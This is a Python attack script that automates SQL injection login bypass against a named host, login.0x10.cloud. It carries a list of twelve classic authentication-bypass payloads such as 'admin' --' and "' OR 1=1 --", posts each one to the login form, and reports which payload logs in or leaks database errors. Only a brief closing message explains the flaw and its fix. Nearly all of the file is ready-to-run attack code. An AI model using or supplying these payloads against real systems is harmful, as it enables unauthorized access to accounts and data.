# ============================================================
#  SQL Injection — Login Bypass
#  Author: [Your Name]
#  Vulnerability: SQL Injection on Blog Login Form
#  Target: blog.0x10.cloud
# ============================================================
#
#  If the login form builds SQL queries by concatenating user
#  input directly, we can inject SQL syntax to bypass auth.
#
#  A vulnerable query looks like:
#    SELECT * FROM users WHERE username='INPUT' AND password='INPUT'
#
#  By injecting:  admin' --
#  The query becomes:
#    SELECT * FROM users WHERE username='admin' --' AND password='...'
#  The -- comments out the password check entirely → instant login.
#
#  Technique: POST requests via urllib with SQL payloads.
#  No external libraries needed.
# ============================================================

import urllib.request
import urllib.parse
import time

TARGET    = "https://login.0x10.cloud/"
LOGIN     = "/login"
DELAY     = 0.15

# Classic SQL injection payloads for login bypass
PAYLOADS = [
    # (username_payload, password_payload, description)
    ("admin' --",          "anything",       "Comment out password check"),
    ("admin' #",           "anything",       "MySQL hash comment"),
    ("' OR '1'='1' --",    "anything",       "Always-true OR clause"),
    ("' OR 1=1 --",        "anything",       "Numeric always-true"),
    ("' OR 1=1#",          "anything",       "MySQL style"),
    ("admin'/*",           "anything",       "Block comment"),
    ("') OR ('1'='1",      "anything",       "Parenthesis bypass"),
    ("' OR 'x'='x",        "anything",       "String equality bypass"),
    ("\" OR \"1\"=\"1",    "anything",       "Double-quote variant"),
    ("admin' OR '1'='1",   "anything",       "OR appended to username"),
    ("' OR 1=1 LIMIT 1;--","anything",       "With LIMIT clause"),
    ("admin'--",           "",               "No space variant"),
]

def try_sqli(username, password):
    data = urllib.parse.urlencode({
        "username": username,
        "password": password
    }).encode("utf-8")

    req = urllib.request.Request(TARGET + LOGIN, data=data, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    req.add_header("User-Agent", "Mozilla/5.0")

    try:
        r = urllib.request.urlopen(req, timeout=5)
        body = r.read().decode("utf-8", errors="ignore")
        return r.status, r.url, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="ignore")
        return e.code, TARGET + LOGIN, body
    except Exception as e:
        return None, TARGET + LOGIN, str(e)


def is_success(final_url, body):
    success_words = ["dashboard", "logout", "welcome", "manage", "signed in", "admin"]
    if any(w in body.lower() for w in success_words):
        return True
    if LOGIN not in final_url.replace(TARGET, ""):
        return True
    return False


print("=" * 60)
print("  SQL Injection Login Bypass — login.0x10.cloud")
print("=" * 60)
print(f"\n  Testing {len(PAYLOADS)} SQLi payloads...\n")

winner = None

for username, password, desc in PAYLOADS:
    status, final_url, body = try_sqli(username, password)

    print(f"  [{desc}]")
    print(f"    Payload:  username={username!r}")
    print(f"    Response: {status}  →  {final_url}")

    if status and is_success(final_url, body):
        winner = (username, password, desc)
        print(f"\n  [!] VULNERABILITY FOUND — payload worked!")
        break

    # Check for SQL error messages leaking in the response
    sql_errors = ["syntax error", "mysql", "sqlite", "postgresql",
                  "ORA-", "you have an error in your sql"]
    for err in sql_errors:
        if err in body.lower():
            print(f"    [!!] SQL ERROR LEAKED IN RESPONSE — database type exposed!")
            print(f"         This confirms SQL injection vulnerability.")
            break

    time.sleep(DELAY)

print("\n" + "=" * 60)
if winner:
    print(f"\n  [!] VULNERABILITY: SQL Injection — Login Bypass")
    print(f"  Working payload: username={winner[0]!r}")
    print(f"  Description: {winner[2]}")
    print(f"\n  SECURITY RISK:")
    print(f"  The login form passes user input directly into a SQL")
    print(f"  query without sanitization. An attacker can bypass")
    print(f"  authentication entirely — no password needed.")
    print(f"  Fix: Use parameterized queries / prepared statements.")
else:
    print("\n  [OK] No SQLi bypass found with these payloads.")
    print("  Tip: Check browser DevTools to confirm form field names.")
    print("       The fields may not be named 'username'/'password'.")

print("=" * 60)